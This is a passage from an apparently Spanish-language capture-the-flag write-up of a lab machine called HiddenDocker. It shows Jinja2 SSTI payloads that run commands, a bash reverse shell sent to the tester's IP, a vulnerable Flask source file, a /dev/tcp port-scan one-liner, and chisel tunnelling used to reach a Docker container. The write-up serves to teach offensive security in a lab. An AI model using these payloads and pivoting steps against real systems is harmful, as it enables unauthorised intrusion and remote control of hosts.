+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">{{</span> 10*50 <span style="color:#f92672">}}</span>
+</span></span></code></pre></div><p>{% endraw %}</p>
+<p>Recuerda probarla en el campo <strong>name</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-hiddenDocker/Captura10.png">
+</p>
+<p>Funcionó.</p>
+<p>Entonces, vamos a probar si ejecuta el comando <strong>id</strong> con el siguiente payload:</p>
+<p>{% raw %}</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">{{</span> self.__init__.__globals__.__builtins__.__import__<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;os&#39;</span><span style="color:#f92672">)</span>.popen<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;id&#39;</span><span style="color:#f92672">)</span>.read<span style="color:#f92672">()</span> <span style="color:#f92672">}}</span>
+</span></span></code></pre></div><p>{% endraw %}</p>
+<p>Probémoslo:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-hiddenDocker/Captura11.png">
+</p>
+<p>Excelente, si lo está ejecutando.</p>
+<p>Directamente, utilicemos una <strong>Reverse Shell</strong> de <strong>Bash</strong>.</p>
+<p>Inicia un listener con <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Ahora, ejecutamos la <strong>Reverse Shell</strong> con el siguiente payload:</p>
+<p>{% raw %}</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">{{</span> self.__init__.__globals__.__builtins__.__import__<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;os&#39;</span><span style="color:#f92672">)</span>.popen<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;%26 /dev/tcp/Tu_IP/443 0&gt;%261&#39;&#34;</span><span style="color:#f92672">)</span>.read<span style="color:#f92672">()</span> <span style="color:#f92672">}}</span>
+</span></span></code></pre></div><p>{% endraw %}</p>
+<p>Una vez que la ejecutes en la página web, observa la <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.10.130<span style="color:#f92672">]</span> <span style="color:#ae81ff">49248</span>
+</span></span><span style="display:flex;"><span>bash: no se puede establecer el grupo de proceso de terminal <span style="color:#f92672">(</span>334<span style="color:#f92672">)</span>: Función ioctl no apropiada para el dispositivo
+</span></span><span style="display:flex;"><span>bash: no hay control de trabajos en este shell
+</span></span><span style="display:flex;"><span>pepinodemar@hiddendocker:~$ whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>pepinodemar
+</span></span></code></pre></div><p>Estamos dentro y nos encontramos en el directorio del <strong>usuario pepinodemar</strong>.</p>
+<p>Obtengamos una sesión interactiva:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Paso 1:</span>
+</span></span><span style="display:flex;"><span>script /dev/null -c bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 2:</span>
+</span></span><span style="display:flex;"><span>CTRL + Z
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 3:</span>
+</span></span><span style="display:flex;"><span>stty raw -echo; fg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 4:</span>
+</span></span><span style="display:flex;"><span>reset -&gt; xterm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 5:</span>
+</span></span><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm
+</span></span><span style="display:flex;"><span>export SHELL<span style="color:#f92672">=</span>bash
+</span></span><span style="display:flex;"><span>stty rows <span style="color:#ae81ff">51</span> columns <span style="color:#ae81ff">189</span>
+</span></span></code></pre></div><p>Continuemos.</p>
+<h2 id="Post">Post Explotación</h2>
+<h3 id="linEnum">Enumeración de la Máquina</h3>
+<p>Veamos qué archivos tiene este usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pepinodemar@hiddendocker:~$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">32</span>
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">4</span> pepinodemar pepinodemar <span style="color:#ae81ff">4096</span> may <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2024</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> root        root        <span style="color:#ae81ff">4096</span> may <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2024</span> ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> root        root           <span style="color:#ae81ff">9</span> may <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2024</span> .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> pepinodemar pepinodemar  <span style="color:#ae81ff">220</span> may <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2024</span> .bash_logout
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> pepinodemar pepinodemar <span style="color:#ae81ff">3526</span> may <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2024</span> .bashrc
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> pepinodemar pepinodemar <span style="color:#ae81ff">4096</span> may <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2024</span> Desktop
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> pepinodemar pepinodemar <span style="color:#ae81ff">4096</span> may <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2024</span> .local
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> pepinodemar pepinodemar  <span style="color:#ae81ff">807</span> may <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2024</span> .profile
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> pepinodemar pepinodemar   <span style="color:#ae81ff">24</span> may <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2024</span> user.txt
+</span></span></code></pre></div><p>Vemos la flag del usuario.</p>
+<p>Leámosla:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pepinodemar@hiddendocker:~$ cat user.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Si revisamos el directorio <strong>Desktop</strong>, ahí encontraremos el directorio de <strong>Flask</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pepinodemar@hiddendocker:~$ ls -la Desktop/flaskapp/
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> pepinodemar pepinodemar <span style="color:#ae81ff">4096</span> may <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2024</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> pepinodemar pepinodemar <span style="color:#ae81ff">4096</span> may <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2024</span> ..
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> pepinodemar pepinodemar  <span style="color:#ae81ff">472</span> may <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2024</span> app.py
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> pepinodemar pepinodemar <span style="color:#ae81ff">4096</span> may <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2024</span> templates
+</span></span></code></pre></div><p>Y si revisamos ese script de <strong>Python</strong>, veremos que fue diseñado para ser vulnerable a <strong>SSTI</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pepinodemar@hiddendocker:~$ cat Desktop/flaskapp/app.py 
+</span></span><span style="display:flex;"><span>from flask import Flask, request, render_template_string, render_template
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask<span style="color:#f92672">(</span>__name__<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>@app.route<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>def index<span style="color:#f92672">()</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;index.html&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>@app.route<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/greet&#39;</span>, methods<span style="color:#f92672">=[</span><span style="color:#e6db74">&#39;POST&#39;</span><span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>def greet<span style="color:#f92672">()</span>:
+</span></span><span style="display:flex;"><span>    name <span style="color:#f92672">=</span> request.form<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;name&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Render the template with the user input directly (vulnerable a SSTI)</span>
+</span></span><span style="display:flex;"><span>    template <span style="color:#f92672">=</span> f<span style="color:#e6db74">&#34;Hello {name}!&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template_string<span style="color:#f92672">(</span>template<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    app.run<span style="color:#f92672">(</span>debug<span style="color:#f92672">=</span>True, host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span><span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Observa que la vulnerabilidad ocurre en la función <code>greet()</code>, esto porque:</p>
+<ul>
+<li>La variable <strong>name</strong> obtiene directamente el contenido que el usuario envía a través del formulario.</li>
+<li>La variable <strong>template</strong> obtiene ese dato sin aplicar alguna sanitización.</li>
+<li>Después, renderiza ese contenido en una plantilla <strong>Jinja2</strong> usando <strong>render_template_string</strong> de forma dinámica, lo que provoca el <strong>SSTI</strong> si no fue sanitizado el dato usado.</li>
+</ul>
+<p>Bastante simple, pero interesante el cómo funciona esta vulnerabilidad.</p>
+<p>De ahí en fuera, no encontraremos algo más.</p>
+<p>Si revisamos qué interfaces existen, veremos que está <strong>docker</strong> instalado:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pepinodemar@hiddendocker:~$ ip a
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>3: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">1500</span> qdisc noqueue state UP group default 
+</span></span><span style="display:flex;"><span>    link/ether nm:8f:0a:8q:c9:76 brd ff:ff:ff:ff:ff:ff
+</span></span><span style="display:flex;"><span>    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>    inet6 fe80::42:7cff:fe8c:298b/64 scope link 
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Normalmente, cuando se crea un contenedor y es el primero en crearse, se le asigna la IP <code>172.17.0.2</code> (a menos que se especifique una IP).</p>
+<p>Comprobémoslo con <strong>ping</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pepinodemar@hiddendocker:~$ ping -c <span style="color:#ae81ff">2</span> 172.17.0.2
+</span></span><span style="display:flex;"><span>PING 172.17.0.2 <span style="color:#f92672">(</span>172.17.0.2<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 172.17.0.2: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.050 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 172.17.0.2: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.035 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 172.17.0.2 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> packets transmitted, <span style="color:#ae81ff">2</span> received, 0% packet loss, time 1007ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 0.035/0.042/0.050/0.007 ms
+</span></span></code></pre></div><p>Bien, aun así, podemos aplicar un <strong>ping sweep</strong> con el siguiente one-liner de <strong>Bash</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pepinodemar@hiddendocker:~$ <span style="color:#66d9ef">for</span> i in <span style="color:#66d9ef">$(</span>seq 254<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> ping 172.17.0.$i -c1 -W1 &amp; <span style="color:#66d9ef">done</span> | grep from
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 172.17.0.2: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.040 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 172.17.0.1: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.031 ms
+</span></span></code></pre></div><p>Excelente, tenemos identificado el contenedor.</p>
+<p>Ahora, utiliza el siguiente one-liner de <strong>Bash</strong> que identifica los puertos abiertos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pepinodemar@hiddendocker:~$ <span style="color:#66d9ef">for</span> port in <span style="color:#f92672">{</span>1..65535<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span> echo &gt; /dev/tcp/172.17.0.2/$port <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;Port: </span>$port<span style="color:#e6db74"> open&#34;</span>; <span style="color:#66d9ef">done</span> 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>Port: <span style="color:#ae81ff">80</span> open
+</span></span></code></pre></div><p>Tiene el <strong>puerto 80</strong> abierto, lo que significa que hay una página web activa.</p>
+<p>Podríamos comprobarlo con <strong>curl</strong>, pero la máquina no lo tiene.</p>
+<h3 id="contenedor">Aplicando Port Forwarding y Tunneling para Ver Página/Contenedor de Docker</h3>
+<p>Entonces, tenemos dos opciones:</p>
+<ul>
+<li>Aplicar <strong>Port Forwarding</strong> para poder ver la página del contenedor.</li>
+<li>Aplicar <strong>Tunneling</strong> para poder ver alcanzar al contenedor y utilizar distintas herramientas sobre este.</li>
+</ul>
+<p>Apliquemos ambas.</p>
+<p>Necesitaremos la herramienta <strong>chisel</strong> que puedes descargar aquí:</p>
+<ul>
+<li><a href="https://github.com/jpillora/chisel" target="_blank">Repositorio de jpillora: chisel</a></li>
+</ul>
+<p>Una vez que la descargues, continúa.</p>
+<h4 id="portForwarding">Aplicando Reverse Port Forwarding para Ver Página Web de Contenedor Docker</h4>
+<p>Primero, vamos a ejecutar <strong>chisel</strong> en nuestra máquina como servidor y eligiendo un puerto para el <strong>Port Forwarding</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./chisel server --reverse -p <span style="color:#ae81ff">1234</span>
+</span></span><span style="display:flex;"><span>2025/06/21 13:42:21 server: Reverse tunnelling enabled
+</span></span><span style="display:flex;"><span>2025/06/21 13:42:21 server: Fingerprint bwWRGzJE....
+</span></span><span style="display:flex;"><span>2025/06/21 13:42:21 server: Listening on http://0.0.0.0:1234
+</span></span></code></pre></div><p>Abre un servidor con <strong>Python</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span></code></pre></div><p>Descarga <strong>chisel</strong> en la máquina víctima:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pepinodemar@hiddendocker:~$ wget http://Tu_IP/chisel
+</span></span></code></pre></div><p>En la máquina víctima, vamos a ejecutar <strong>chisel</strong> como cliente para que se conecte al servidor de <strong>chisel</strong> de nuestra máquina:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./chisel client Tu_IP:1234 R:Puerto_kali_a_Usar:172.17.0.2:80
+</span></span><span style="display:flex;"><span>2025/06/21 21:50:33 client: Connecting to ws://Tu_IP:1234
+</span></span><span style="display:flex;"><span>2025/06/21 21:50:33 client: Connected <span style="color:#f92672">(</span>Latency 1.457318ms<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Le indicamos nuestra IP y el puerto usado en el servidor (<code>client Tu_IP:1234</code>), después aplicamos el <strong>Reverse Port Forwarding</strong> (<code>R:</code>) para que utilice un puerto de nuestra máquina, que servirá para mostrar la página web del contenedor (<code>Puerto_kali_a_Usar:172.17.0.2:80</code>).</p>
+<p>Con esto listo, visitemos el <strong>localhost</strong> con el puerto que utilizaste.</p>
+<p>En mi caso, usé el <strong>puerto 3000</strong> de mi máquina para aplicar el <strong>Reverse Port Forwarding</strong> y poder mostrar la página web:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-hiddenDocker/Captura12.png">
+</p>
+<p>Excelente, ha funcionado correctamente.</p>
+<p>Puedes utilizar cualquier herramienta dirigiéndola a <code>localhost_o_127.0.0.1:puerto_usado</code>, por ejemplo, usemos <strong>nmap</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p <span style="color:#ae81ff">3000</span> 127.0.0.1
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-06-21 14:01 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> localhost <span style="color:#f92672">(</span>127.0.0.1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.000049s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>3000/tcp open  http    Apache httpd 2.4.58 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-title: Dockerlabs
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.58 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 11.71 seconds
+</span></span></code></pre></div><p>Funciona bien.</p>
+<h4 id="Tunneling">Aplicando Reverse Tunneling con SOCKS Proxy para Alcanzar Contenedor de Docker</h4>
+<p>Primero, vamos a ejecutar <strong>chisel</strong> en nuestra máquina como servidor y eligiendo un puerto para el <strong>Tunneling</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./chisel server --reverse -p <span style="color:#ae81ff">1234</span>
+</span></span><span style="display:flex;"><span>2025/06/21 13:42:21 server: Reverse tunnelling enabled
+</span></span><span style="display:flex;"><span>2025/06/21 13:42:21 server: Fingerprint bwWRGzJE....
+</span></span><span style="display:flex;"><span>2025/06/21 13:42:21 server: Listening on http://0.0.0.0:1234
+</span></span></code></pre></div><p>Abre un servidor con <strong>Python</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span></code></pre></div><p>Descarga <strong>chisel</strong> en la máquina víctima:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pepinodemar@hiddendocker:~$ wget http://Tu_IP/chisel
+</span></span></code></pre></div><p>Digamos que por X o Y motivo, no sabes qué puertos tiene activo el contenedor/máquina; en ese caso, vamos a aplicar <strong>Tunneling con SOCKS Proxy</strong>.</p>
+<p>Para esto, debemos revisar qué versión de <strong>SOCKS</strong> tenemos instalada, que lo comprobamos si tenemos el archivo <code>/etc/proxychains.conf</code> o <code>/etc/proxychains4.conf</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>locate proxychains
+</span></span><span style="display:flex;"><span>/etc/proxychains4.conf
+</span></span></code></pre></div><p>En mi caso, tengo el archivo <code>/etc/proxychains4.conf</code>.</p>
+<p>Ahí mismo, veremos qué versión de <strong>SOCKS</strong> tenemos, pues se ve al final del archivo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/proxychains4.conf | tail -n <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># defaults set to &#34;tor&#34;</span>
+</span></span><span style="display:flex;"><span>socks4 	127.0.0.1 <span style="color:#ae81ff">9050</span>
+</span></span></code></pre></div><p>Vemos que tengo el <strong>SOCKS4</strong>.</p>
+<p>Modifiquémoslo cambiando <strong>socks4</strong> por <strong>socks5</strong> y cambiamos el puerto a <strong>1080</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/proxychains4.conf | tail -n <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># defaults set to &#34;tor&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#socks4  127.0.0.1 9050</span>
+</span></span><span style="display:flex;"><span>socks5	 127.0.0.1 <span style="color:#ae81ff">1080</span>
+</span></span></code></pre></div><p>Esto lo hacemos porque <strong>chisel</strong> funciona con esa versión de <strong>SOCKS</strong> y ese puerto.</p>
+<p>Con esto listo, utilizamos <strong>chisel</strong> como cliente en la máquina víctima para conectarse a nuestro servidor de <strong>chisel</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pepinodemar@hiddendocker:~$ ./chisel client Tu_IP:1234 R:socks
+</span></span><span style="display:flex;"><span>2025/06/21 22:30:08 client: Connecting to ws://Tu_IP:1234
+</span></span><span style="display:flex;"><span>2025/06/21 22:30:08 client: Connected <span style="color:#f92672">(</span>Latency 1.293463ms<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Lo único que cambia, es que indicamos que se utilizará <strong>SOCKS</strong>.</p>
+<p>Comprobemos que sirvió con la herramienta <strong>proxychains</strong> y <strong>nmap</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>proxychains nmap -sT -Pn -n -p1-100 172.17.0.2 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-06-21 14:48 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 172.17.0.2
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.011s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">99</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 1.58 seconds
+</span></span></code></pre></div><p>Ya descubrimos que hay una página web en el <strong>puerto 80</strong>.</p>
+<p>Si queremos verla, podemos registrar el <strong>SOCKS5 Proxy</strong> en la extensión <strong>FoxyProxy</strong>:</p>
+<p align="center">
